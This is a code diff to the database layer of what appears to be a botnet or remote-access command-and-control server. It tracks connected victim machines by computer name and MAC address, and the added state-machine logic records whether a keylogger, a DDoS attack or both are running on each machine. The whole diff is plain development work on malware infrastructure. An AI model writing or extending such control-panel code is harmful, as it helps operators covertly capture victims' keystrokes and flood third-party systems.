@@ -54,11 +54,10 @@ class SessionDAO:
     
     def handle_session(self, session_dict):
         if not session_dict.get('uid'):
-            identity = str(session_dict['mac_address'] + session_dict['owner']).encode()
-            session_dict['uid'] = hashlib.md5(identity).hexdigest()
+            session_dict['uid'] = session_dict['computer_name'] + '_' + session_dict['mac_address']
         
         session_dict['online'] = True
-
+        session_dict['running'] = 0
         session = self.get_session(session_dict['uid'])
 
         if not session:
@@ -92,6 +91,8 @@ class SessionDAO:
         session = db.session.query(self.model).filter_by(uid=session_uid).first()
         if session:
             session.online = bool(status)
+            if not bool(status):
+                session.running = 0
             db.session.commit()
 
     def delete_session(self, session_uid):
@@ -135,6 +136,28 @@ class TaskDAO:
             if task:
                 task.result = task_dict.get('result')
                 task.completed = datetime.utcnow()
+                session = session_dao.get_session(task_dict.get('session'))
+                if session:
+                    if session.running == 0:
+                        if task.result == "Keylogger started":
+                            session.running = 1
+                        elif task.result == "DDoS attack started":
+                            session.running = 2
+                    elif session.running == 1:
+                        if task.result == "Keylogger stopped":
+                            session.running = 0
+                        elif task.result == "DDoS attack started":
+                            session.running = 3
+                    elif session.running == 2:
+                        if task.result == "DDoS attack stopped":
+                            session.running = 0
+                        elif task.result == "Keylogger started":
+                            session.running = 3
+                    elif session.running == 3:
+                        if task.result == "Keylogger stopped":
+                            session.running = 2
+                        elif task.result == "DDoS attack stopped":
+                            session.running = 1
         db.session.commit()
         return task_dict
 
